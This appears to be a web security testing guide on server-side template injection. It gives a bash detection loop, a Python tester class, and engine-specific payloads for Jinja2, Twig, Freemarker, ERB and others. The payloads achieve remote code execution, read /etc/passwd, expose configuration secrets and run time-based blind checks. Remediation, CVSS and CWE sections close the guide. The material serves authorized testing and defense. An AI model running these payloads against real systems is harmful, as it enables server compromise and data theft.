# WSTG-INPV-18: Testing for Server-Side Template Injection (SSTI)

## Test ID
WSTG-INPV-18

## Test Name
Testing for Server-Side Template Injection (SSTI)

## High-Level Description

Server-Side Template Injection occurs when user input is embedded in templates in an unsafe manner. Attackers can inject template directives to execute arbitrary code on the server, read files, or access sensitive data. This affects frameworks like Jinja2, Twig, Freemarker, Velocity, and others.

---

## What to Check

- [ ] Template engine detection
- [ ] Sandbox escape
- [ ] Remote code execution
- [ ] File read via templates
- [ ] Blind SSTI
- [ ] Framework-specific payloads

---

## How to Test

### Step 1: Detect Template Engine

```bash
#!/bin/bash
TARGET="https://target.com/page"

echo "[*] Testing for SSTI..."

# Universal detection payloads
PAYLOADS=(
    "{{7*7}}"
    "${7*7}"
    "<%= 7*7 %>"
    "#{7*7}"
    "*{7*7}"
    "@(7*7)"
    "{{7*'7'}}"
    "${{7*7}}"
)

for payload in "${PAYLOADS[@]}"; do
    encoded=$(echo -n "$payload" | jq -sRr @uri)
    response=$(curl -s "$TARGET?name=$encoded")
    if echo "$response" | grep -q "49"; then
        echo "[VULN] SSTI detected with: $payload"
    fi
done
```

### Step 2: SSTI Vulnerability Tester

```python
#!/usr/bin/env python3
"""
Server-Side Template Injection (SSTI) Tester
"""

import requests
import re

class SSTITester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()
        self.detected_engine = None

    # Detection payloads for different template engines
    DETECTION_PAYLOADS = {
        'Jinja2/Twig': ['{{7*7}}', '{{7*\'7\'}}'],
        'Freemarker': ['${7*7}', '#{7*7}'],
        'Velocity': ['#set($x=7*7)$x', '$class.inspect("java.lang.Runtime")'],
        'Smarty': ['{php}echo 7*7;{/php}', '{7*7}'],
        'ERB': ['<%= 7*7 %>', '<%= system("id") %>'],
        'Mako': ['${7*7}', '<%import os%>${os.popen("id").read()}'],
        'Pebble': ['{{7*7}}', '{% set x=7*7 %}{{x}}'],
        'Thymeleaf': ['[[${7*7}]]', '[(${7*7})]'],
    }

    # RCE payloads by template engine
    RCE_PAYLOADS = {
        'Jinja2': [
            "{{config}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        'Twig': [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
            "{{app.request.server.all|join(',')}}",
        ],
        'Freemarker': [
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/etc/passwd").toURL().openStream().readAllBytes()?join(" ")}',
        ],
        'Velocity': [
            '#set($x="")##$x.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")',
        ],
        'ERB': [
            '<%= system("id") %>',
            '<%= `id` %>',
            '<%= IO.popen("id").readlines() %>',
        ],
        'Mako': [
            '${self.module.cache.util.os.popen("id").read()}',
            '<%import os%>${os.popen("id").read()}',
        ],
        'Thymeleaf': [
            '${T(java.lang.Runtime).getRuntime().exec("id")}',
        ],
    }

    def detect_template_engine(self, param='name'):
        """Detect which template engine is in use"""
        print("\n[*] Detecting template engine...")

        for engine, payloads in self.DETECTION_PAYLOADS.items():
            for payload in payloads:
                try:
                    response = self.session.get(
                        self.url,
                        params={param: payload}
                    )

                    # Check for math evaluation (7*7 = 49)
                    if '49' in response.text and payload not in response.text:
                        print(f"[+] Detected: {engine}")
                        print(f"  Payload: {payload}")
                        self.detected_engine = engine.split('/')[0]
                        self.findings.append({
                            'type': 'SSTI Detected',
                            'engine': engine,
                            'payload': payload,
                            'severity': 'High'
                        })
                        return engine

                except Exception as e:
                    pass

        return None

    def test_rce(self, param='name'):
        """Test for Remote Code Execution"""
        print("\n[*] Testing for RCE...")

        if not self.detected_engine:
            # Try all payloads if engine not detected
            engines_to_test = self.RCE_PAYLOADS.keys()
        else:
            engines_to_test = [self.detected_engine]

        for engine in engines_to_test:
            if engine not in self.RCE_PAYLOADS:
                continue

            for payload in self.RCE_PAYLOADS[engine]:
                try:
                    response = self.session.get(
                        self.url,
                        params={param: payload}
                    )

                    # Check for command execution indicators
                    if 'uid=' in response.text or 'root:' in response.text:
                        print(f"[VULN] RCE achieved with {engine}!")
                        print(f"  Payload: {payload[:60]}...")
                        self.findings.append({
                            'type': 'SSTI RCE',
                            'engine': engine,
                            'payload': payload,
                            'severity': 'Critical'
                        })
                        return True

                    # Check for config/object disclosure
                    if 'SECRET_KEY' in response.text or 'config' in response.text.lower():
                        print(f"[VULN] Config disclosure with {engine}!")
                        self.findings.append({
                            'type': 'SSTI Config Disclosure',
                            'engine': engine,
                            'payload': payload,
                            'severity': 'High'
                        })

                except Exception as e:
                    pass

        return False

    def test_blind_ssti(self, param='name'):
        """Test for blind SSTI via time-based"""
        print("\n[*] Testing blind SSTI...")

        import time

        blind_payloads = [
            # Jinja2
            "{{request.application.__globals__.__builtins__.__import__('time').sleep(5)}}",
            # ERB
            "<%= sleep(5) %>",
            # Freemarker
            "${Thread.sleep(5000)}",
        ]

        for payload in blind_payloads:
            try:
                start = time.time()
                self.session.get(
                    self.url,
                    params={param: payload},
                    timeout=15
                )
                elapsed = time.time() - start

                if elapsed > 4:
                    print(f"[VULN] Blind SSTI detected!")
                    print(f"  Response time: {elapsed:.2f}s")
                    self.findings.append({
                        'type': 'Blind SSTI',
                        'payload': payload,
                        'response_time': elapsed,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("SSTI VULNERABILITY REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo SSTI vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'engine' in f:
                    print(f"  Engine: {f['engine']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload'][:60]}...")

    def run_tests(self, param='name'):
        """Run all SSTI tests"""
        self.detect_template_engine(param)
        self.test_rce(param)
        self.test_blind_ssti(param)
        self.generate_report()

# Usage
tester = SSTITester("https://target.com/page")
tester.run_tests()
```

### Step 3: SSTI Payload Reference

```python
# Jinja2 (Python)
{{config}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{["id"]|map("system")|join}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${product.getClass().getProtectionDomain().getCodeSource().getLocation()}

# ERB (Ruby)
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").readlines() %>

# Velocity (Java)
#set($runtime=RuntimeClass().getRuntime())$runtime.exec('id')

# Pebble (Java)
{%set cmd='id'%}{{variable.getClass().forName('java.lang.Runtime').getRuntime().exec(cmd)}}
```

---

## Tools

| Tool | Purpose |
|------|---------|
| tplmap | Automated SSTI exploitation |
| Burp Suite | Manual testing |
| SSTImap | SSTI scanner |

---

## Remediation

```python
# Jinja2 - Use sandboxed environment
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(user_template)

# Better: Never allow user-controlled templates
# Only allow user data as variables
template = env.get_template('fixed_template.html')
output = template.render(user_data=safe_data)
```

```java
// Freemarker - Disable dangerous classes
Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| SSTI with RCE | 9.8 | Critical |
| SSTI config disclosure | 7.5 | High |
| SSTI file read | 7.5 | High |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-1336** | Improper Neutralization of Special Elements Used in a Template Engine |

---

## Checklist

```
[ ] Template engine detected
[ ] RCE payloads tested
[ ] Blind SSTI tested
[ ] Config disclosure tested
[ ] Sandbox escape tested
[ ] Findings documented
```
